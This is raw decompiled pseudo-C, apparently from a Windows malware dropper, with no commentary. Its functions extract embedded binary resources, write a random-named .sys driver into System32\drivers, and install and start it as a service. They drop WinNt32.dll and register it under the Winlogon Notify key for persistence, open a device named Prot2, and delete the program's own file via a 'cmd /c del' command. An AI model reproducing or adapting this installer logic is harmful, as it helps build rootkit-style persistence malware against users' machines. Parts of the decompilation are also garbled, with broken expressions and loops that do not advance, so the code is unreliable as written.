L08001340(_unknown_ __ecx, signed int* _a4, intOrPtr _a8, signed int _a12)
{
    signed int* _v8;
    _unknown_ __ebp;
    signed int _t26;

    _push(__ecx);
    _v8 = _a4;
    while(1) {
        _t26 = _a12 - 1;
        _a12 = _t26;
        if(_a12 == 0) {
            break;
        }
         *_a4 = _t26 & 4294967295;
        _a4 =  &(_a4[0]);
        _a8 = _a8 + 1;
    }
    return _v8;
}

L08001390(_unknown_ __ecx, signed int* _a4, _unknown_ _a8, signed int _a12)
{
    signed int* _v8;
    _unknown_ __ebp;
    signed int _t17;

    _push(__ecx);
    _v8 = _a4;
    while(1) {
        _t17 = _a12;
        _a12 = _a12 - 1;
        if(_t17 == 0) {
            break;
        }
         *_a4 = _t17 & 4294967295;
        _a4 =  &(_a4[0]);
    }
    return _v8;
}

L080013D0(_unknown_ __eax, long _a4)
{
    _unknown_ __ebp;
    _unknown_ _t2;
    _unknown_ _t3;

    if( *134230024 == 0) {
         *134230024 = GetProcessHeap();
    }
    if( *134230024 == 0) {
        return 0;
    }
    return HeapAlloc( *134230024, 0, _a4);
}

L08001420(void* _a4)
{
    _unknown_ __ebp;
    _unknown_ _t2;
    _unknown_ _t4;

    if( *134230024 == 0) {
        return ;
    }
    HeapFree( *134230024, 0, _a4);
    return;
}

L08001450()
{
    _unknown_ _t21;
    _unknown_ _t22;
    _unknown_ _t24;
    _unknown_ _t25;
    _unknown_ _t27;

L1:
     *((char*)(__ebp + lstrlenA(__ebp + -632) + -634)) = 0;
     *((intOrPtr*)(__ebp + -292)) = __ebp + -631;
    goto L2;
L2:
    if(GetShortPathNameA( *((intOrPtr*)(__ebp + -292)),  *((intOrPtr*)(__ebp + -292)), 260) != 0) {
L3:
        lstrcpyA(__ebp + -272, (char*)("/c del "));
        lstrcatA(__ebp + -272,  *((intOrPtr*)(__ebp + -292)));
        lstrcatA(__ebp + -272, (char*)(" >> NUL"));
        GetEnvironmentVariableA((char*)("ComSpec"),  *((intOrPtr*)(__ebp + -292)), 260);
        if(CreateProcessA( *((intOrPtr*)(__ebp + -292)), __ebp + -272, 0, 0, 0, 134217728, 0, 0, __ebp + -368, __ebp + -288) != 0) {
L4:
            ExitProcess(0);
        }
    }
L5:
    L08001FF8( *((intOrPtr*)(__ebp - 4)) ^ __ebp);
    _pop(__ebp);
    return;
L6:
}

L080015A0(struct HINSTANCE__* _a4, signed short _a8, CHAR* _a12, long* _a16)
{
    struct HRSRC__* _v8;
    long _v12;
    struct HRSRC__* _v16;
    void* _v20;
    void* _v24;
    _unknown_ __ebp;
    _unknown_ _t36;
    _unknown_ _t40;

    _v16 = 0;
    _v8 = 0;
    if(_a8 == 0) {
        if(_a12 != 0) {
            _v8 = FindResourceA(_a4, _a12, "BIN");
        }
    } else {
        _v8 = FindResourceA(_a4, _a8 & 65535, "BIN");
    }
    _v20 = LoadResource(_a4, _v8);
    _v12 = SizeofResource(_a4, _v8);
    if(_v20 == 0) {
        return _v16;
    }
    _v24 = LockResource(_v20);
    if(_v24 != 0) {
         *_a16 = _v12;
        _v16 = L080013D0(_a16, _v12);
        L08001340(_v24, _v16, _v24, _v12);
    }
    FreeResource(_v20);
    return _v16;
}

L08001670(_unknown_ __ecx, CHAR* _a4, void* _a8, long _a12)
{
    void* _v8;
    _unknown_ __ebp;
    _unknown_ _t11;
    _unknown_ _t15;
    _unknown_ _t16;
    _unknown_ _t17;

    _push(__ecx);
    if(_a8 == 0) {
        return 0;
    }
    if(_a12 == 0) {
        return 0;
    }
    _v8 = CreateFileA(_a4, 1073741824, 0, 0, 2, 128, 0);
    if(_v8 == 255) {
        return 0;
    }
    WriteFile(_v8, _a8, _a12,  &_a12, 0);
    CloseHandle(_v8);
    return 1;
}

L080016E0()
{
    intOrPtr _v12;
    _unknown_ __ebp;
    _unknown_ _t4;

    QueryPerformanceCounter( &_v12);
    return _v12;
}

L08001700(_unknown_ __eax, CHAR* _a4, CHAR* _a8)
{
    _unknown_ __ebp;
    _unknown_ _t47;
    signed int _t48;
    _unknown_ _t50;
    signed int _t52;
    _unknown_ _t54;
    signed int _t56;
    _unknown_ _t58;
    signed int _t60;
    _unknown_ _t62;
    signed int _t64;
    _unknown_ _t66;
    _unknown_ _t68;
    _unknown_ _t70;
    _unknown_ _t71;
    _unknown_ _t73;
    _unknown_ _t74;
    _unknown_ _t75;
    _unknown_ _t76;
    _unknown_ _t77;
    _unknown_ _t78;

    _t48 = L080016E0();
    asm("cdq ");
     *_a8 = (_t48 & 4294967295 & ) % 25 + 65 & 4294967295;
    _t52 = L080016E0();
    asm("cdq ");
    _a8[1] = (_t52 & 4294967295 & ) % 25 + 97 & 4294967295;
    _t56 = L080016E0();
    asm("cdq ");
    _a8[2] = (_t56 & 4294967295 & ) % 25 + 97 & 4294967295;
    _t60 = L080016E0();
    asm("cdq ");
    _a8[3] = (_t60 & 4294967295 & ) % 9 + 48 & 4294967295;
    _t64 = L080016E0();
    asm("cdq ");
    _a8[4] = (_t64 & 4294967295 & ) % 9 + 48 & 4294967295;
    _a8[5] = 0;
    GetEnvironmentVariableA("SystemRoot", _a4, 260);
    lstrcatA(_a4, "\System32\drivers\");
    lstrcatA(_a4, _a8);
    lstrcatA(_a4, ".sys");
    return;
}

L080017E0(CHAR* _a4)
{
    _unknown_ __ebp;
    _unknown_ _t4;
    _unknown_ _t5;

    GetEnvironmentVariableA("SystemRoot", _a4, 260);
    lstrcatA(_a4, "\System32\WinNt32.dll");
    return;
}

L08001820(_unknown_ __eax, intOrPtr _a4, intOrPtr _a8)
{
    void* _v8;
    intOrPtr _v12;
    long _v16;
    void* _v20;
    _unknown_ __ebp;
    _unknown_ _t21;
    _unknown_ _t28;

    _v12 = 1;
    _push(983103);
    _push(0);
    _push(0);
    _v20 = OpenSCManagerA();
    _push(983551);
    _push(_a8);
    _push(_v20);
    _v8 = OpenServiceA();
    if(_v8 == 0) {
        _push(0);
        _push(0);
        _push(0);
        _push(0);
        _push(0);
        _push(_a4);
        _push(0);
        _push(3);
        _push(1);
        _push(983551);
        _push(0);
        _push(_a8);
        _push(_v20);
        _v8 = CreateServiceA();
    }
    if(_v8 == 0) {
L5:
        _v16 = GetLastError();
        if(_v16 != 1056) {
            _v12 = 0;
        } else {
            _v12 = 1;
        }
L8:
        if(_v8 == 0) {
            return _v12;
        }
        CloseServiceHandle(_v8);
        return _v12;
    }
    _push(0);
    _push(0);
    _push(_v8);
    if(StartServiceA() == 0) {
        goto L5;
    }
    _v12 = 1;
    goto L8;
}

L080018F0()
{
}

L08001A00()
{
}

L08001BA0()
{
    char _v8;
    void* _v12;
    CHAR* _v16;
    CHAR* _v20;
    char _v24;
    _unknown_ __ebp;
    _unknown_ _t18;
    _unknown_ _t22;
    _unknown_ _t26;
    _unknown_ _t27;
    _unknown_ _t29;
    _unknown_ _t30;

    _v20 = "WinNt32.dll";
    _v16 = "WLEventStartShell";
    _v8 = 0;
    _v24 = 0;
    _push( &_v12);
    _push("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\WinNt32");
    _push(-2147483646);
    RegCreateKeyA();
    _push(lstrlenA(_v20) + 1);
    _push(_v20);
    _push(1);
    _push(0);
    _push("DLLName");
    _push(_v12);
    RegSetValueExA();
    _push(lstrlenA(_v16) + 1);
    _push(_v16);
    _push(1);
    _push(0);
    _push("StartShell");
    _push(_v12);
    RegSetValueExA();
    _push(4);
    _push( &_v8);
    _push(4);
    _push(0);
    _push("Impersonate");
    _push(_v12);
    RegSetValueExA();
    _push(4);
    _push( &_v24);
    _push(4);
    _push(0);
    _push("Asynchronous");
    _push(_v12);
    RegSetValueExA();
    RegCloseKey(_v12);
    return;
}

L08001C70()
{
    _unknown_ __ebp;

    CreateFileA("\\.\Prot2", -1073741824, 0, 0, 2, 128, 0);
    return;
}

L08001FF8(_unknown_ __ecx)
{
    __ecx = __ecx;
    if(__ecx ==  *134230016) {
        asm("rep ret ");
    }
}

L08001FF8(_unknown_ __ecx)
{
    __ecx = __ecx;
    if(__ecx ==  *134230016) {
        asm("rep ret ");
    }
}

// Statistics:
//       6 Register nodes
//      16 Temporaries nodes
//       0 Casts
//     462 Statements
//      10 Labels
//       2 Gotos
//      18 Blocks
//     624 Nodes
//       6 Assembly nodes
//      61 Unknown Types


